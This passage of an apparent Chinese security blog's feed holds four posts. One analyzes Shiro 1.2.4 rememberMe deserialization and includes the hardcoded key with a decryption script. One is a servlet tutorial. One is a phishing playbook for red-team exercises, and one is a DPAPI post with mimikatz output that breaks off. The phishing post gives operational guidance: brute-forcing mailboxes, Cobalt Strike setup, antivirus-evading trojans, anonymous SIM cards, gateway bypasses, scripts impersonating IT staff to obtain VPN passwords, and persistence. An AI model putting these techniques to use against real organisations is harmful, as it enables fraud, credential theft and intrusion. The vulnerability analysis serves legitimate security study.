alt></p><p>跟进decrypt</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/4.png" alt></p><p>跟进getDecryptionCipherKey，会返回decryptionCipherKey，其实这里就等于DEFAULT_CIPHER_KEY_BYTES，也就是我们一直寻找的秘钥</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/5.png" alt><br>这里的秘钥为：kPH+bIxk5D2deZiIxcaaaA==</p><p>我们回到decrypt函数<br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/6.png" alt><br>这里我们可以看见我们的向量(iv)为16字节，并且内容为RememberMe通过base64解密后的前16位，后面即为我们的反序列化内容</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/6.png" alt></p><p>继续跟进来到JcaCipherService的crypt方法，调用initNewCipher，跟进<br><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/7.png" alt></p><p>我们看到这里的加密方式为CBC，至此我们解密所需的内容全部收集完毕，我们可以写脚本来进行测试。</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/8.png" alt><br>这里尝试解密rememberMe，base64解码之后用网上的脚本进行AES解密一直不成功，折腾了好几天一直报错，后来想着可能吧解密的内容写入文件再读取可能有问题，后来改了下网上的脚本，直接base64解码进行AES解码，这样就不报错了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def decode_rememberme_file():</span><br><span class="line">    key  =  &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    IV   = b&apos; &apos; * 16</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">    rem = &quot;0DOaI2x90RcR5SP6rCnGX1cT2ZUVv4Mq2iH3/6ZNvUuZkWDgPvsvJ5nTlO69Z3u2X6Wtb+7a7B+D0D9KILfHdtQHro9fUqiWtjkUeP2Y8ca7nbY9JPCcaEBkExk8+thVsa2DCCL9NpL+WQTxGz/UXSpevdEIU4RKmO98G5qEgI0vIaAbtLwb1FLuIm2x2JBqmqV+LEpE/Ag4mEhP99lfHhPIMK5ZLt1z7F9iFv2XKLU4tdx7LDqQwcEpNgIny5EfplmnUWUoJQoR7hOjaa0FDILqz6AXbKw5CqymWQho4TAsnYrnBpAw5iBNLB9b5Z7zux8wSFsbc8atLBAG16qiepj0mIf4GeNMoSMWJTEVYu9gdkJxeKkgXACa8L8M73a1lcH2OD1ye8N9i6fi6T/Te+VeJjB1+wknwMzvO/v4M+L+JZ6A0GXx0V6Z60U2E/7Tdytz2EJoLwzXnzstjAHZOL2OXLF9gGxN+kfRom7iTOci6eytPaP9OsPomLEMxrDs&quot;</span><br><span class="line">    b_rem = base64.b64decode(rem);</span><br><span class="line">    print(b_rem)</span><br><span class="line">    remember_bin = encryptor.decrypt(b_rem)</span><br><span class="line">    return remember_bin</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    with open(&quot;decrypt.bin&quot;, &apos;wb+&apos;) as fpw:</span><br><span class="line">        fpw.write(decode_rememberme_file())</span><br></pre></td></tr></table></figure><p>写入文件读取报错如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ValueError: Data must be padded to 16 byte boundary in CBC mode</span><br></pre></td></tr></table></figure></p><p>然后在linux下利用hexdump查看文件内容，发现我们反序列化的特征啦:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">00000000  06 77 dd c9 34 6e 00 17  77 18 a4 48 82 18 cf ee  |.w..4n..w..H....|</span><br><span class="line">00000010  ac ed 00 05 73 72 00 32  6f 72 67 2e 61 70 61 63  |....sr.2org.apac|</span><br><span class="line">00000020  68 65 2e 73 68 69 72 6f  2e 73 75 62 6a 65 63 74  |he.shiro.subject|</span><br><span class="line">00000030  2e 53 69 6d 70 6c 65 50  72 69 6e 63 69 70 61 6c  |.SimplePrincipal|</span><br><span class="line">00000040  43 6f 6c 6c 65 63 74 69  6f 6e a8 7f 58 25 c6 a3  |Collection..X%..|</span><br><span class="line">00000050  08 4a 03 00 01 4c 00 0f  72 65 61 6c 6d 50 72 69  |.J...L..realmPri|</span><br><span class="line">00000060  6e 63 69 70 61 6c 73 74  00 0f 4c 6a 61 76 61 2f  |ncipalst..Ljava/|</span><br><span class="line">00000070  75 74 69 6c 2f 4d 61 70  3b 78 70 73 72 00 17 6a  |util/Map;xpsr..j|</span><br><span class="line">00000080  61 76 61 2e 75 74 69 6c  2e 4c 69 6e 6b 65 64 48  |ava.util.LinkedH|</span><br><span class="line">00000090  61 73 68 4d 61 70 34 c0  4e 5c 10 6c c0 fb 02 00  |ashMap4.N\.l....|</span><br><span class="line">000000a0  01 5a 00 0b 61 63 63 65  73 73 4f 72 64 65 72 78  |.Z..accessOrderx|</span><br><span class="line">000000b0  72 00 11 6a 61 76 61 2e  75 74 69 6c 2e 48 61 73  |r..java.util.Has|</span><br><span class="line">000000c0  68 4d 61 70 05 07 da c1  c3 16 60 d1 03 00 02 46  |hMap......`....F|</span><br><span class="line">000000d0  00 0a 6c 6f 61 64 46 61  63 74 6f 72 49 00 09 74  |..loadFactorI..t|</span><br><span class="line">000000e0  68 72 65 73 68 6f 6c 64  78 70 3f 40 00 00 00 00  |hresholdxp?@....|</span><br><span class="line">000000f0  00 0c 77 08 00 00 00 10  00 00 00 01 74 00 08 69  |..w.........t..i|</span><br><span class="line">00000100  6e 69 52 65 61 6c 6d 73  72 00 17 6a 61 76 61 2e  |niRealmsr..java.|</span><br><span class="line">00000110  75 74 69 6c 2e 4c 69 6e  6b 65 64 48 61 73 68 53  |util.LinkedHashS|</span><br><span class="line">00000120  65 74 d8 6c d7 5a 95 dd  2a 1e 02 00 00 78 72 00  |et.l.Z..*....xr.|</span><br><span class="line">00000130  11 6a 61 76 61 2e 75 74  69 6c 2e 48 61 73 68 53  |.java.util.HashS|</span><br><span class="line">00000140  65 74 ba 44 85 95 96 b8  b7 34 03 00 00 78 70 77  |et.D.....4...xpw|</span><br><span class="line">00000150  0c 00 00 00 10 3f 40 00  00 00 00 00 01 74 00 04  |.....?@......t..|</span><br><span class="line">00000160  72 6f 6f 74 78 78 00 77  01 01 71 00 7e 00 05 78  |rootxx.w..q.~..x|</span><br><span class="line">00000170  10 10 10 10 10 10 10 10  10 10 10 10 10 10 10 10  |................|</span><br><span class="line">00000180</span><br></pre></td></tr></table></figure></p><p>继续跟踪先前的代码，会来到convertBytesToPrincipals函数</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/9.png" alt></p><p>跟进deserialize函数，找到我们的漏洞点：</p><p><img src="/2020/08/02/shiro-1-2-4反序列化漏洞分析/10.png" alt></p><p>蛮好的哈~</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/three_feng/article/details/52189559" title="SHIRO-550 反序列化漏洞分析" target="_blank" rel="noopener">SHIRO-550 反序列化漏洞分析</a></p><p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4" title="https://paper.seebug.org/shiro-rememberme-1-2-4" target="_blank" rel="noopener">【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;官方issue:&lt;br&gt;&lt;a href=&quot;https://issues.apache.org/jira/browse/SHIRO-550&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://issues.apache.org/jira/brows
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>IDEA新建Servlet</title>
    <link href="http://sherlocz.github.io/2020/07/05/IDEA%E6%96%B0%E5%BB%BAServlet/"/>
    <id>http://sherlocz.github.io/2020/07/05/IDEA新建Servlet/</id>
    <published>2020-07-05T06:28:48.000Z</published>
    <updated>2020-07-05T07:44:35.739Z</updated>
    
    <content type="html"><![CDATA[<p>Servlet为Server Applet，即服务器在启动时会运行的小程序。</p><p>通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面复写了servlet的方法，就可以被tomcat解析出来。</p><h1 id="IDEA与Tomcat联动"><a href="#IDEA与Tomcat联动" class="headerlink" title="IDEA与Tomcat联动"></a>IDEA与Tomcat联动</h1><p>点击Run—&gt;Debug-&gt;Edit Configuaration-&gt;+(Add New Comfiguaration)<br>选中Tomcat-&gt;local，箭头处选中你Tomcat安装的路径Apply保存。<br><img src="/2020/07/05/IDEA新建Servlet/tomcat.png" alt></p><p>然后File-&gt;New Module，新建一个Web Application<br><img src="/2020/07/05/IDEA新建Servlet/web.png" alt></p><p>新建好之后目录结构如下：<br><img src="/2020/07/05/IDEA新建Servlet/ok.png" alt></p><p>点击Shift+F10运行起来，这个时候我们的index.jsp被成功运行起来了<br><img src="/2020/07/05/IDEA新建Servlet/8888.png" alt></p><p>箭头所示的地方可以自定义我们访问的url路径。<br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt></p><h1 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h1><p>首先我们在src目录下新建一个包，然后新建一个ServletDemo.class，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package cn.s1.web.servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ServletDemo implements Servlet &#123;</span><br><span class="line">/*Servlet初始化时运行，只运行一次*/</span><br><span class="line">    @Override</span><br><span class="line">    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">/*获取servlet的配置信息*/</span><br><span class="line">    @Override</span><br><span class="line">    public ServletConfig getServletConfig() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">/*每次servlet被访问时运行一次*/</span><br><span class="line">    @Override</span><br><span class="line">    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Hello Servlet!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">/*获取servlet的一些信息*/</span><br><span class="line">    @Override</span><br><span class="line">    public String getServletInfo() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">/*在服务器关闭的时候运行*/</span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先我们需要将这个类implements Servlet，由于Servlet这个接口有抽象类的方法，我们在集成的时候需要重写，这里我重写service这个方法输出了一行字。</p><p>然后我们需要配置web.xml，在其中设置好我们servlet的路径和解析的类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">//设置servlet名称</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">//设置对应的class类</span><br><span class="line">        &lt;servlet-class&gt;cn.s1.web.servlet.ServletDemo&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">//Demo这个servlet解析时候需要访问的url地址</span><br><span class="line">        &lt;url-pattern&gt;/Demo&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></p><p>这个时候我们再运行该项目，访问<a href="http://localhost:8888/Demo，结果如下：" target="_blank" rel="noopener">http://localhost:8888/Demo，结果如下：</a><br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt><br>结果为空白，我们看控制台输出的信息：<br><img src="/2020/07/05/IDEA新建Servlet/hello.png" alt></p><p>和我们重写的service方法打印的字符串一样，说明创建成功！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Servlet为Server Applet，即服务器在启动时会运行的小程序。&lt;/p&gt;
&lt;p&gt;通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面复写了servlet的方法，就可以被tomcat解析出来。&lt;
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>钓鱼小结</title>
    <link href="http://sherlocz.github.io/2020/06/24/%E9%92%93%E9%B1%BC%E5%B0%8F%E7%BB%93/"/>
    <id>http://sherlocz.github.io/2020/06/24/钓鱼小结/</id>
    <published>2020-06-24T09:15:32.000Z</published>
    <updated>2020-07-18T11:29:19.444Z</updated>
    
    <content type="html"><![CDATA[<p>随着攻防演练的进行，外网能够挖掘到的漏洞必然会越来越少，而且常规Web渗透耗时长，这个时候利用钓鱼攻击不仅效率高，并且能够为我们节省大量的时间和人力，说不定未来钓鱼攻击会成为每个一线渗透人员必须掌握的技能。</p><p>钓鱼的手法有很多种，其中我们会遇到各种各样的问题，要去不断的进行尝试，反思。</p><p><img src="/2020/06/24/钓鱼小结/钓鱼.png" alt></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>前期的准备是为了让我们有充足的时间去思考会发生的各种问题，而在我们没有收集到足够信息之前，建议不要盲目进行钓鱼。</p><h2 id="突破口选择"><a href="#突破口选择" class="headerlink" title="突破口选择"></a>突破口选择</h2><p>钓鱼需要一个下手的地方，对于我们的目标，通常会有多个钓鱼的口子供我们选择，如：</p><ul><li>QQ/微信(群)钓鱼</li><li>客服钓鱼</li><li>邮件钓鱼</li><li>电话钓鱼</li><li>……</li></ul><p>想到了可以突破的点，我们就需要去搜寻相关信息。</p><h3 id="QQ-微信群收集"><a href="#QQ-微信群收集" class="headerlink" title="QQ/微信群收集"></a>QQ/微信群收集</h3><p>很多公司都会开放对外的客服群、售后群、活动群甚至内部员工群、公司群，通过QQ或者其他的搜索方式多多少少都能搜索到群聊，伪装成员工或者客服进群聊。<br><img src="/2020/06/24/钓鱼小结/QQ群.png" alt></p><p>如何伪装进入群聊：<br>1、修改个人信息为员工/客户信息(包括姓名、签名、头像等等)<br>2、提前半个月或者一个月进入群聊(攻防演练阶段进去的可能性不大)</p><h3 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h3><p>邮箱的收集会很重要，所以尽量收集全面一点，最好能够弄到邮箱的账号密码，对后期钓鱼很有用，整体思路如下：<br><img src="/2020/06/24/钓鱼小结/邮箱收集.png" alt></p><p>邮箱收集网址和工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bit4woo/teemo</span><br><span class="line">https://github.com/laramies/theHarvester</span><br><span class="line">https://www.email-format.com/i/search/</span><br></pre></td></tr></table></figure></p><p>邮箱验证网址和工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mailtester.com/testmail.php</span><br><span class="line">https://github.com/Tzeross/verifyemail</span><br></pre></td></tr></table></figure></p><p>邮箱爆破工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shack2/SNETCracker</span><br><span class="line">brupsuite</span><br></pre></td></tr></table></figure></p><p>推荐使用pop/smtp协议爆破，web端爆破可能会产生告警</p><h2 id="其他信息调研"><a href="#其他信息调研" class="headerlink" title="其他信息调研"></a>其他信息调研</h2><p>除了上述我们收集的目标信息，我们还需要尽可能的调研到以下几点：</p><ul><li><p>组织架构<br>部门领导信息、信息技术部成员信息、运维人员信息、新入职员工信息…</p></li><li><p>安全设备部署情况<br>TSM、HIDS、天眼、 EDR、赛门铁克、360、卡巴斯基…</p></li><li><p>……</p></li></ul><h1 id="钓鱼准备"><a href="#钓鱼准备" class="headerlink" title="钓鱼准备"></a>钓鱼准备</h1><h2 id="邮件服务器"><a href="#邮件服务器" class="headerlink" title="邮件服务器"></a>邮件服务器</h2><p>搭建邮服是为了方便我们发送钓鱼邮件，准备两台邮件服务器，一主一备。<br><img src="/2020/06/24/钓鱼小结/ewomail.png" alt></p><ul><li><p>邮服搭建：<br><a href="https://www.iredmail.com/" target="_blank" rel="noopener">https://www.iredmail.com/</a><br><a href="http://www.ewomail.com/" target="_blank" rel="noopener">http://www.ewomail.com/</a></p></li><li><p>服务器选择：<br>阿里云、华为云等大型服务厂商会禁止搭建邮服，可以选择小型服务器提供商</p></li><li><p>伪装域名：<br>com/cn/co这样的后缀可以，top/me/xyz后缀容易被识破</p></li><li><p>SSL证书：<br>防止被归类为垃圾邮件</p></li></ul><h2 id="邮件正文编写"><a href="#邮件正文编写" class="headerlink" title="邮件正文编写"></a>邮件正文编写</h2><ul><li><p>标题<br>可以在标题上加上【紧急通知】字眼，催促对方查看邮件</p></li><li><p>正文主题<br>HW终端加固方案<br>内部软件更新包</p></li><li><p>签名<br>很多公司都会有各自的签名，我们前期搞到一个邮箱的账号密码，就知道签名是什么样子了。</p></li><li><p>附件<br>木马附件添加压缩密码，压缩码直接写在正文中或者用图片格式插入。</p></li></ul><h2 id="CS服务器配置"><a href="#CS服务器配置" class="headerlink" title="CS服务器配置"></a>CS服务器配置</h2><ul><li>修改随机端口+密码</li><li>修改SSL证书</li><li>配置Malleable-C2-Profiles（隐藏隧道、伪装流量）</li><li>配置Server酱上线通知</li><li>使用便捷cna插件(on beacon_initial )</li><li>删除空格后门</li></ul><h2 id="免杀木马"><a href="#免杀木马" class="headerlink" title="免杀木马"></a>免杀木马</h2><p>对于前期调研的内部安全防护工具，针对性的制作免杀木马，减少在免杀上面花费的时间。</p><ul><li>二进制免杀</li><li>静态免杀</li><li>动态免杀</li></ul><p><a href="https://github.com/TideSec/BypassAntiVirus" target="_blank" rel="noopener">https://github.com/TideSec/BypassAntiVirus</a></p><h2 id="匿名手机卡"><a href="#匿名手机卡" class="headerlink" title="匿名手机卡"></a>匿名手机卡</h2><p>用来进行电话钓鱼，防止被防守队溯源</p><ul><li>阿里小号（<a href="https://aliqin.tmall.com/）" target="_blank" rel="noopener">https://aliqin.tmall.com/）</a></li><li>寻找卡商购买匿名卡</li></ul><h2 id="绕过邮件网关"><a href="#绕过邮件网关" class="headerlink" title="绕过邮件网关"></a>绕过邮件网关</h2><p>有的时候我们发送的邮件会被拒收或者拦截，我们要尝试绕过：</p><ul><li>附件密码以图片形式插入，而非直接写在正文当中</li><li>附件和附件密码分开发送</li><li>不接收有附件的邮件，百度网盘，火狐网盘插入到正文当中</li></ul><h1 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h1><h2 id="安全意识"><a href="#安全意识" class="headerlink" title="安全意识"></a>安全意识</h2><p>我们在诱导的前期可以检查目标员工是否有安全意识，可以先发一个无毒文件过去，若验证对方没有很强的安全意识，我们可以再发木马过去，减少被发现钓鱼攻击的可能性。</p><h2 id="话语诱导"><a href="#话语诱导" class="headerlink" title="话语诱导"></a>话语诱导</h2><ul><li><p>伪装客户诱导客服<br>你们的xxx系统/app无法登陆，我发个截图给你们看吧！<br>请你们配合我的工作！不要耽误我的时间！</p></li><li><p>伪装运维人员诱导员工<br>你好，我是(信息)安全/管理部门的xxx，后台监测到您的电脑触发了告警，请使用我们提供的工具进行清理。<br>你好，我们后台监控到您的vpn存在异常，请提供账号密码（验证码）！情况紧急！</p></li><li><p>伪装上级诱导下属员工<br>我给你发了个表格，尽快帮我整理好，等会开会需要。</p></li><li><p>伪装钓鱼邮件被发现，进行回击<br>再发一封邮件：《关于近期收到钓鱼邮件应对措施》<br>由于近期钓鱼事件频发，为了避免公司内部网络木马感染，请运行公司下发的清理程序。<br>后台会实时监控您是否运行了程序，纳入绩效考核！请立即运行程序清理！</p></li></ul><h2 id="xss漏洞诱导"><a href="#xss漏洞诱导" class="headerlink" title="xss漏洞诱导"></a>xss漏洞诱导</h2><p>XSS配合Flash或者自制木马进行钓鱼<br><a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">https://github.com/r00tSe7en/Fake-flash.cn</a></p><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p>我们会遇到员工下班关机或者使用的是云桌面，这个时候我们的权限第二天可能就没了，需要做好权限维持进行后续的内网渗透。</p><p>常见权限维持方法：</p><ul><li>修改注册表</li><li>修改服务（包括svchost-x…）</li><li>配置启动项</li><li>配置计划任务</li><li>Dll劫持(白加黑)</li><li>PE感染<br>……</li></ul><p>结合CS插件进行权限维持：<br><a href="https://github.com/0xthirteen/StayKit" target="_blank" rel="noopener">https://github.com/0xthirteen/StayKit</a><br><a href="https://github.com/0xthirteen/MoveKit" target="_blank" rel="noopener">https://github.com/0xthirteen/MoveKit</a></p><h1 id="后期复盘"><a href="#后期复盘" class="headerlink" title="后期复盘"></a>后期复盘</h1><p>后期需要对钓鱼的人员、获取的信息、木马的名称、邮箱的附件进行统计，方便后续的复盘以及清理。</p><p>总结钓鱼中出现的问题，进行讨论给出解决方案，避免问题再次出现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着攻防演练的进行，外网能够挖掘到的漏洞必然会越来越少，而且常规Web渗透耗时长，这个时候利用钓鱼攻击不仅效率高，并且能够为我们节省大量的时间和人力，说不定未来钓鱼攻击会成为每个一线渗透人员必须掌握的技能。&lt;/p&gt;
&lt;p&gt;钓鱼的手法有很多种，其中我们会遇到各种各样的问题，要
      
    
    </summary>
    
    
    
      <category term="钓鱼" scheme="http://sherlocz.github.io/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>DPAPI学习记录</title>
    <link href="http://sherlocz.github.io/2020/06/24/DPAPI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://sherlocz.github.io/2020/06/24/DPAPI学习记录/</id>
    <published>2020-06-24T08:14:28.000Z</published>
    <updated>2020-06-29T03:28:55.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h1><p>DPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。</p><p>应用范围：</p><ul><li>IE、Chrome的登录表单自动完成</li><li>Powershell加密函数</li><li>Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。</li><li>FTP管理账户密码</li><li>共享资源文件夹的访问密码</li><li>无线网络帐户密钥和密码</li><li>远程桌面身份凭证</li></ul><h1 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h1><p>位置：<strong>%APPDATA%/Microsoft/Protect/%SID%</strong><br>这里我的虚拟机中的masterkeyfile name为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">a94e3c00-08e5-4272-8648-f7a796159916</span><br></pre></td></tr></table></figure></p><p>由于该文件为受保护的，所以我们要勾选掉 <strong>隐藏受保护的操作系统文件</strong></p><p><img src="/2020/06/24/DPAPI学习记录/file.png" alt></p><p>master key file为二进制文件，可以获取文件中的Masterkey破解登陆密码，包含以下五个部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Header and system information</span><br><span class="line">User’s Master Key</span><br><span class="line">Local backup encryption key</span><br><span class="line">Unique CREDHIST file identifier</span><br><span class="line">Domain Master Key backup</span><br></pre></td></tr></table></figure></p><p>利用mimikatz对MasterKeyFile进行解析，这里只是解析格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # dpapi::masterkey /in:C:\Users\swag7\AppData\Roaming\Microsoft\Protect\S-1-5-21-3716468413-4174316740-3893867168-1001\88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">**MASTERKEYS**</span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  szGuid             : &#123;88536919-3ca5-4e31-a0ac-1ccf6eb94dda&#125;</span><br><span class="line">  dwFlags            : 00000005 - 5</span><br><span class="line">  dwMasterKeyLen     : 000000b0 - 176</span><br><span class="line">  dwBackupKeyLen     : 00000090 - 144</span><br><span class="line">  dwCredHistLen      : 00000014 - 20</span><br><span class="line">  dwDomainKeyLen     : 00000000 - 0</span><br><span class="line">[masterkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : 824e5853fe8cc89a609ea3d6fdf63b49</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : b1509914bf8fafaf32f0686555097ad5f6241061f2857972710a788b3c4dcce9733d7ae5fd45b7c3483a07321e6c0fb047cb06389b0567b6964c7382255d25c1a316a75c6839d7a516540a10c49941b02e3b7d08bcbca8c6ed4362469b9eafbbecca62ac20a03aa9ae739e23d67f2446a77b63b00166c2616ac31de9b59327afa6975f440bb735a95427413c1a209036</span><br><span class="line"></span><br><span class="line">[backupkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : b9eba682e6a10a6eabe2a671f2a5f970</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 